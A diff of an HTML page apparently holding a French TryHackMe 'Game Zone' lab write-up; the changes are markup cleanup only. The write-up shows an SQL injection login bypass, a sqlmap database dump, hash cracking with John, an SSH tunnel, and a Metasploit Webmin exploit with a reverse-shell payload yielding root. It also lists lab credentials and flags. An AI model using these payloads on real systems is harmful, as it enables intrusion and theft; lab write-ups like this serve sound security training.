@@ -39,15 +39,14 @@
 <main>
 <section class="section">
 <div class="container">
-<div class="fade-in" style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-muted);margin-bottom:1.5rem;"><a href="../index" style="color:var(--text-muted);">Home</a> &gt; TryHackMe: <span style="color:var(--green);">Gamezone</span></div>
+<div class="" style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-muted);margin-bottom:1.5rem;"><a href="../index" style="color:var(--text-muted);">Home</a> &gt; TryHackMe: <span style="color:var(--green);">Gamezone</span></div>
 <div class="writeup-layout">
-<article class="writeup-content fade-in">
+<article class="writeup-content">
 <div style="margin-bottom:2rem;">
 <div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.75rem;flex-wrap:wrap;">
 <span class="tag">SQLI</span><span class="tag blue">SQLmap</span><span class="tag purple">John</span><span class="tag">SSH</span><span class="tag blue">Metasploit</span><span class="tag purple">Privilege Escalation</span><span class="tag">Webmin</span>
 </div>
 <h1 style="font-size:2rem;font-weight:800;color:var(--text-primary);margin-bottom:0.75rem;">Game Zone - TryHackMe Writeup</h1>
-
 <div style="display: flex; gap: 1rem; align-items: center; color: var(--text-muted); font-size: 0.9rem; margin-bottom: 2rem;"><img alt="jaxafed" src="/assets/images/avatar.jpg" style="width:30px; height:30px; border-radius:50%; margin:0;"/><span>By <strong>jaxafed</strong> • 9 min read</span></div></div>
 <h3 id="objectif">Objectif</h3>
 <p>Exploiter une vulnérabilité SQLi pour obtenir des mots de passe à craquer avec john et avoir un accès distant à la cible et utiliser metasploitable pour l’élevation de privilèges</p>
@@ -55,16 +54,16 @@
 <p>Lancer la machine vulnérable pour obtenir une adresse ip et ensuite se rendre sur la page d’acceuil via <code>http://machine_ip</code></p>
 <h3 id="task2-obtain-access-via-sqli">Task2: Obtain access via SQLi</h3>
 <p>La page d’acceuil présente un formulaire de connexion. On peut se connecter sans mot de passe avec le payload dans le champ username et un mot de passe aléatoire. </p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">sql</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-sql"><code class="language-sql">' OR 1=1-- -
-</code></code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">sql</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-sql">' OR 1=1-- -
+</code></pre></div></div>
 <p>L’application est donc vulnérable à une SQLi.On est redirigé vers la page portal.php</p>
 <p>Question: When you've logged in, what page do you get redirected to?</p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>portal.php
-</code></code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>portal.php
+</code></pre></div></div>
 <h3 id="task3-using-sqlmap">Task3: Using SQLmap</h3>
 <p>L’objectif ici est de récupérer les données de la base de donnée. La page portal.php est une page de recherche. On teste dans le champ de recherche test et on intercepte la requête via BurpSuite qu’on copie dans un fichier request.txt</p>
 <p>Exemple de contenu de request.txt</p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>POST /portal.php HTTP/1.1
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>POST /portal.php HTTP/1.1
 Host: lab.thm
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -80,85 +79,85 @@ Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 
 searchitem=test
-</code></code></pre></div></div>
+</code></pre></div></div>
 <p>On peut donc passez ce fichier à sqlmap</p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">sqlmap -r request.txt --dbms=mysql --dump</span>
-</code></code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">sqlmap -r request.txt --dbms=mysql --dump</span>
+</code></pre></div></div>
 <p><img alt="image.png" src="attachment:6163d572-46ac-4544-ae58-c96f2e03e1f4:image.png"/></p>
 <ol>
 <li>In the users table, what is the hashed password? </li>
 </ol>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
-</code></code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
+</code></pre></div></div>
 <ol>
 <li>What was the username associated with the hashed password?</li>
 </ol>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>agent47
-</code></code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>agent47
+</code></pre></div></div>
 <ol>
 <li>What was the username associated with the hashed password?</li>
 </ol>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>post
-</code></code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>post
+</code></pre></div></div>
 <h3 id="task4-cracking-a-password-with-john-the-ripper">Task4: Cracking a password with John The Ripper</h3>
 <p>L’objectif est de cracker le hash de agent47 obtenu via John the Ripper. Après avoir copié le mot de passe dans hash.txt on exécute pour détecter la version du hash </p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span>
-</code></code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span>
+</code></pre></div></div>
 <p>On obtient</p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>Warning: detected hash type "cryptoSafe", but the string is also recognized as "Raw-SHA256"
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>Warning: detected hash type "cryptoSafe", but the string is also recognized as "Raw-SHA256"
 
-</code></code></pre></div></div>
+</code></pre></div></div>
 <p>On peut donc cracher le hash avec le format <code>Raw-SHA256</code></p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span>
-</code></code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span>
+</code></pre></div></div>
 <p>Ainsi ,</p>
 <ol>
 <li>What is the de-hashed password?</li>
 </ol>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>videogamer124
-</code></code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>videogamer124
+</code></pre></div></div>
 <ol>
 <li>Now you have a password and username. Try SSH'ing onto the machine. What is the user flag?</li>
 </ol>
 <p>Il faut se connecter via ssh </p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">ssh agent47@lab.thm</span>
-</code></code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">ssh agent47@lab.thm</span>
+</code></pre></div></div>
 <p><img alt="image.png" src="attachment:cb8d7108-2615-48b4-b077-87c9d443d914:image.png"/></p>
 <p>Le flag est donc</p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>649ac17b1480ac13ef1e4fa579dac95c
-</code></code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>649ac17b1480ac13ef1e4fa579dac95c
+</code></pre></div></div>
 <h3 id="task5-exposing-services-with-reverse-ssh-tunnels">Task5: Exposing services with reverse SSH tunnels</h3>
 <ol>
 <li>How many TCP sockets are running?</li>
 </ol>
 <p><img alt="image.png" src="attachment:5b2cb01f-7b25-4652-9fd3-22c5956a0043:image.png"/></p>
 <p>La réponse est donc: </p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>5
-</code></code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>5
+</code></pre></div></div>
 <ol>
 <li>What is the name of the exposed CMS?</li>
 </ol>
 <p>On se connecte via </p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">ssh -L 10000:localhost:10000 agent47@lab.thm</span>
-</code></code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">ssh -L 10000:localhost:10000 agent47@lab.thm</span>
+</code></pre></div></div>
 <p>Ensuite dan notre navigateur on se rend sur  <a href="http://localhost:10000/"><code>http://localhost:10000/</code></a></p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>http://localhost:10000/
-</code></code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>http://localhost:10000/
+</code></pre></div></div>
 <p>A la page de connexion on se connecte via </p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>username : agent47
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>username : agent47
 password: videogamer124
-</code></code></pre></div></div>
+</code></pre></div></div>
 <p>La réponse est donc:</p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>Webmin
-</code></code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>Webmin
+</code></pre></div></div>
 <ol>
 <li>What is the CMS version?</li>
 </ol>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>1.580
-</code></code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>1.580
+</code></pre></div></div>
 <h3 id="task6-privilege-escalation-with-metasploit">Task6 : Privilege Escalation with Metasploit</h3>
 <p>L’objectif est d’utiliser metasploitable pour obtenir un accès root en exploitation la version vulnérable de webmin</p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="hl-comment"># msfconsole</span>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><span class="hl-comment"># msfconsole</span>
 <span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">msf &gt; search -name=webmin 1.580</span>
 <span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">msf &gt; use 0</span>
 <span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">msf exploit(unix/webapp/webmin_show_cgi_exec) &gt; set password videogamer124</span>
@@ -168,10 +167,10 @@ password: videogamer124
 <span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">msf exploit(unix/webapp/webmin_show_cgi_exec) &gt; set rhosts 127.0.0.1</span>
 <span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">msf exploit(unix/webapp/webmin_show_cgi_exec) &gt; set ssl fal</span>
 <span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">msf exploit(unix/webapp/webmin_show_cgi_exec) &gt; run</span>
-</code></code></pre></div></div>
+</code></pre></div></div>
 <p>Le payload choisis est <code>cmd/unix/reverse</code> car la cible est un système unix(Linux) et le tunnel <code>10000:localhost:10000</code> est en raison de l’incapacité d’accéder au service via l’extérieur.</p>
 <p>On obtient un accès root à la machine donc on stabilise le shell et on récupère le flag</p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">python3 --version</span>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">python3 --version</span>
 <span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Python 3.5.2</span>
 <span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
 <span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">root@gamezone:/usr/share/webmin/file/# ls /root</span>
@@ -181,10 +180,10 @@ password: videogamer124
 <span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">cat /root/root.txt</span>
